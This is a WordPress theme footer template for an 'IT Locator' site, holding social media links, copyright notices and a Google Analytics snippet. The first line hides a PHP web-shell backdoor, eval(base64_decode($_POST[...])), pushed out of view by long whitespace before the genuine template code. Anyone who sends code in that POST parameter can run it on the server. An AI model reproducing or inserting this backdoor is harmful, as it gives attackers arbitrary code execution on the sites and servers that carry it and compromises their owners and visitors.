<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n44390c']));?><?php
/**
 * The template for displaying the footer.
 *
 * Contains footer content and the closing of the
 * #main and #page div elements.
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */
?>
<!-- Footer area starts -->
	<div class="footer visible-desktop" style="background:#1b1b1b;">
		<div class="container dMx" style="margin-top:2%; max-width:50%;">
			<div class="row-fluid">
				
				<div class="span12">
					<div class="displayB aCenter dMxx">
						
						
						<?php dynamic_sidebar('sidebar-2'); ?>
				
					</div>
					
					<div class="displayB aCenter tMx">
						<ul class="inline">
							<li><a href="http://www.facebook.com/pages/It-Locator/332478326874389"><img src="<?php bloginfo("template_url"); ?>/img/fb.png" /></a></li>
							<li><a href="https://twitter.com/ITLocator"><img src="<?php bloginfo("template_url"); ?>/img/tw.png" /></a></li>
							<li><a href="http://www.linkedin.com/company/it-locator?trk=cp_followed_name_it-locator
"><img src="<?php bloginfo("template_url"); ?>/img/li.png" /></a></li>
							<li><a href="https://plus.google.com/u/0/b/111305971792275167678/111305971792275167678/posts/p/pub
" target="_blank"><img src="<?php bloginfo("template_url"); ?>/img/gg.png" /></a></li>
						</ul>
					</div>
					
					<div class="displayB aCenter">
						<strong style="font-size:14px; color:#4e4d4d;">Copyright &copy; Technology Net, Inc. All Right Reserved</strong>
					</div>
				</div>
				
			</div>
		</div>
	</div><!-- Footer ends -->
	
	<!-- footer on tablet and phone starts-->
	<div class="footer footer-phone hidden-desktop lg-grey">
		<div class="container">
			<div class="row-fluid">
				<div class="span6 pull-left">
					<p class="noMargin">&copy; 2003-2013 IT Locator.</p>
				</div>
				
				<div class="span5 pull-right">
					<ul class="nav nav-pills noMargin phn-foooter-link">
						<li class="active"><a href="#"> Privacy Policy</a></li>
						<li><a href="#"> How it works</a></li>
						<li><a href="#"> Support</a></li>
					</ul>
				</div>
			</div>
		</div>
	</div><!-- footer on tablet and phone starts-->
	<script type="text/javascript">
	 
	  var _gaq = _gaq || [];
	  _gaq.push(['_setAccount', 'UA-39582608-1']);
	  _gaq.push(['_trackPageview']);
	 
	  (function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	  })();
	 
	</script>
<?php wp_footer(); ?>
</body>
</html>